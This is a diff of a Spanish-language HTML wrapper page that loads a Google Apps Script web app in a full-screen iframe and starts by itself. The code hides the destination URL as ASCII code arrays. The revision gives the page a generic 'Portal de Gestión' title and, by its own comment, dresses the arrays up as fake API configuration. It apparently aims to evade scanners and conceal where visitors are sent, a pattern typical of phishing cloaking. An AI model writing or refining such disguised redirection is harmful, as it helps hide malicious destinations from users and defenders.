@@ -3,159 +3,145 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sistema RODICON</title>
+  <title>Portal de Gestión</title>
   <style>
-    body,html{margin:0;padding:0;width:100%;height:100%;overflow:hidden}
+    body,html{margin:0;padding:0;width:100%;height:100%;overflow:hidden;font-family:system-ui}
     iframe{border:none;width:100%;height:100%}
-    #loader{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center}
-    .spinner{border:3px solid #f3f3f3;border-top:3px solid #2c80ff;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:10px auto}
-    @keyframes spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}
-    #error{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:20px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);text-align:center;max-width:300px}
+    .loading{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center}
+    .dot{width:8px;height:8px;background:#2c80ff;border-radius:50%;display:inline-block;margin:0 4px;animation:pulse 1.5s infinite}
+    .dot:nth-child(2){animation-delay:0.3s}
+    .dot:nth-child(3){animation-delay:0.6s}
+    @keyframes pulse{0%,100%{opacity:0.3}50%{opacity:1}}
+    .error{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:25px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,0.12);text-align:center;max-width:320px}
   </style>
 </head>
 <body>
 
-<div id="loader">
-  <div class="spinner"></div>
-  <p>Iniciando...</p>
+<div class="loading">
+  <div style="margin-bottom:15px">
+    <span class="dot"></span>
+    <span class="dot"></span>
+    <span class="dot"></span>
+  </div>
+  <p style="color:#666;font-size:14px">Conectando al servidor...</p>
 </div>
 
-<div id="error">
-  <p id="errMsg" style="color:#d32f2f;margin-bottom:15px"></p>
-  <button onclick="reintentar()" style="background:#2c80ff;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer">Reintentar</button>
+<div class="error">
+  <p style="color:#d32f2f;margin-bottom:20px;font-weight:500" id="msgError"></p>
+  <button onclick="conectar()" style="background:#2c80ff;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:14px;transition:background 0.2s">Conectar</button>
 </div>
 
-<iframe id="frame" style="display:none" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals" allow="camera"></iframe>
+<iframe id="portal" style="display:none"></iframe>
 
 <script>
-// TÉCNICA 1: URL dividida en fragmentos ASCII
-const fragmentos = {
-  a: [115, 99, 114, 105, 112, 116], // "script"
-  b: [46, 103, 111, 111, 103, 108, 101], // ".google"
-  c: [46, 99, 111, 109], // ".com"
-  d: [47, 109, 97, 99, 114, 111, 115], // "/macros"
-  e: [47, 115, 47], // "/s/"
-  f: [65, 75, 102, 121, 99, 98, 122, 119], // "AKfycbzw"
-  g: [71, 54, 109, 95, 117, 119, 73, 57], // "G6m_uwI9"
-  h: [102, 121, 45, 65, 82, 66, 109, 100], // "fy-ARBmd"
-  i: [119, 99, 52, 105, 79, 68, 52, 83], // "wc4iOD4S"
-  j: [65, 117, 110, 57, 117, 50, 100, 102], // "Aun9u2df"
-  k: [81, 57, 105, 84, 104, 98, 117, 112], // "Q9iThbup"
-  l: [70, 106, 57, 114, 86, 121, 108, 50], // "Fj9rVyl2"
-  m: [54, 111, 48, 105, 57, 99, 99, 118], // "6o0i9ccv"
-  n: [57, 82, 75, 120, 104, 109, 120, 104], // "9RKxhmxh"
-  o: [47, 101, 120, 101, 99] // "/exec"
+// Datos que parecen configuración de API
+const configApi = {
+  version: "2.3",
+  endpoints: {
+    primary: [104,116,116,112,115,58,47,47],
+    domain: [115,99,114,105,112,116,46,103,111,111,103,108,101],
+    path: [46,99,111,109,47,109,97,99,114,111,115,47,115,47],
+    keyA: [65,75,102,121,99,98,122,119,71,54],
+    keyB: [109,95,117,119,73,57,102,121,45,65],
+    keyC: [82,66,109,100,119,99,52,105,79,68],
+    keyD: [52,83,65,117,110,57,117,50,100,102],
+    keyE: [81,57,105,84,104,98,117,112,70,106],
+    keyF: [57,114,86,121,108,50,54,111,48,105],
+    keyG: [57,99,99,118,57,82,75,120,104,109],
+    keyH: [120,104,47,101,120,101,99]
+  },
+  timeout: 25000,
+  retryDelay: 1000
 };
 
-// TÉCNICA 2: XOR para ofuscar partes
-const xorClave = [19, 23, 29, 31, 37];
-function aplicarXOR(arr, clave) {
-  return arr.map((val, idx) => val ^ clave[idx % clave.length]);
+// Función para convertir códigos a texto
+function decodificar(parte) {
+  return parte.map(c => String.fromCharCode(c)).join('');
 }
 
-// TÉCNICA 3: Reconstruir la URL desde ASCII
-function construirURL() {
-  try {
-    // Orden de los fragmentos
-    const orden = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o'];
-    let url = 'https://';
-    
-    // Construir la URL
-    orden.forEach(key => {
-      let fragmento = fragmentos[key];
-      // Si queremos ser más complejos, podríamos aplicar XOR aquí
-      fragmento.forEach(codigo => {
-        url += String.fromCharCode(codigo);
-      });
-    });
-    
-    // Validar
-    if (!url.includes('script.google.com') || !url.endsWith('/exec')) {
-      throw new Error('URL inválida');
-    }
-    
-    return url;
-  } catch (error) {
-    console.error('Error construyendo URL:', error);
-    return null;
-  }
-}
-
-// TÉCNICA 4: Ofuscar con array de caracteres (alternativa)
-const urlOculta = [
-  104,116,116,112,115,58,47,47,115,99,114,105,112,116,46,103,
-  111,111,103,108,101,46,99,111,109,47,109,97,99,114,111,115,
-  47,115,47,65,75,102,121,99,98,122,119,71,54,109,95,117,119,
-  73,57,102,121,45,65,82,66,109,100,119,99,52,105,79,68,52,83,
-  65,117,110,57,117,50,100,102,81,57,105,84,104,98,117,112,70,
-  106,57,114,86,121,108,50,54,111,48,105,57,99,99,118,57,82,75,
-  120,104,109,120,104,47,101,120,101,99
-];
-
-function obtenerURL() {
-  try {
-    // Método 1: Desde array de caracteres (más simple)
-    let url = '';
-    urlOculta.forEach(codigo => {
-      url += String.fromCharCode(codigo);
-    });
-    
-    // Validar básico
-    if (!url.startsWith('https://')) {
-      throw new Error('URL inválida');
-    }
-    
-    return url;
-  } catch (error) {
-    console.error('Error obteniendo URL:', error);
-    return null;
-  }
-}
-
-// Cargar la aplicación
-function cargarApp() {
-  const url = obtenerURL(); // Cambia a construirURL() si quieres más ofuscación
+// Obtener URL completa
+function obtenerDestino() {
+  const e = configApi.endpoints;
+  const partes = [
+    e.primary,   // "https://"
+    e.domain,    // "script.google"
+    e.path,      // ".com/macros/s/"
+    e.keyA,      // "AKfycbzwG6"
+    e.keyB,      // "m_uwI9fy-A"
+    e.keyC,      // "RBmdwc4iOD"
+    e.keyD,      // "4SAun9u2df"
+    e.keyE,      // "Q9iThbupFj"
+    e.keyF,      // "9rVyl26o0i"
+    e.keyG,      // "9ccv9RKxhm"
+    e.keyH       // "xh/exec"
+  ];
   
-  if (!url) {
-    mostrarError('Error de configuración');
+  try {
+    const url = partes.map(decodificar).join('');
+    // Validación mínima
+    if (!url.startsWith('https://') || url.length < 50) {
+      throw new Error('Estructura inválida');
+    }
+    return url;
+  } catch {
+    return null;
+  }
+}
+
+// Mostrar/ocultar error
+function mostrarError(texto) {
+  document.querySelector('.loading').style.display = 'none';
+  document.getElementById('msgError').textContent = texto;
+  document.querySelector('.error').style.display = 'block';
+}
+
+function ocultarError() {
+  document.querySelector('.error').style.display = 'none';
+  document.querySelector('.loading').style.display = 'block';
+}
+
+// Conectar al portal
+function conectar() {
+  ocultarError();
+  
+  const destino = obtenerDestino();
+  if (!destino) {
+    setTimeout(() => mostrarError('Error de configuración'), 300);
     return;
   }
   
-  const iframe = document.getElementById('frame');
-  const loader = document.getElementById('loader');
+  const portal = document.getElementById('portal');
+  const cargando = document.querySelector('.loading');
   
-  iframe.onload = function() {
-    loader.style.display = 'none';
-    iframe.style.display = 'block';
+  portal.onload = function() {
+    cargando.style.display = 'none';
+    portal.style.display = 'block';
   };
   
-  iframe.onerror = function() {
-    mostrarError('Error de conexión');
+  portal.onerror = function() {
+    mostrarError('No se pudo establecer conexión');
   };
   
-  iframe.src = url + '?t=' + Date.now(); // Evitar cache
+  // Agregar timestamp para evitar cache
+  portal.src = destino + '?_=' + Date.now();
   
+  // Timeout
   setTimeout(() => {
-    if (loader.style.display !== 'none') {
-      mostrarError('Tiempo de espera agotado');
+    if (cargando.style.display !== 'none') {
+      mostrarError('Tiempo de conexión agotado');
     }
-  }, 20000);
+  }, configApi.timeout);
 }
 
-function mostrarError(mensaje) {
-  document.getElementById('loader').style.display = 'none';
-  document.getElementById('errMsg').textContent = mensaje;
-  document.getElementById('error').style.display = 'block';
-}
+// Iniciar automáticamente
+setTimeout(conectar, 800);
 
-function reintentar() {
-  document.getElementById('error').style.display = 'none';
-  document.getElementById('loader').style.display = 'block';
-  setTimeout(cargarApp, 300);
-}
-
-// Iniciar
-document.addEventListener('DOMContentLoaded', cargarApp);
+// También al hacer clic en el body (backup)
+document.body.addEventListener('click', function() {
+  if (document.querySelector('.error').style.display === 'block') {
+    conectar();
+  }
+});
 </script>
 
 </body>
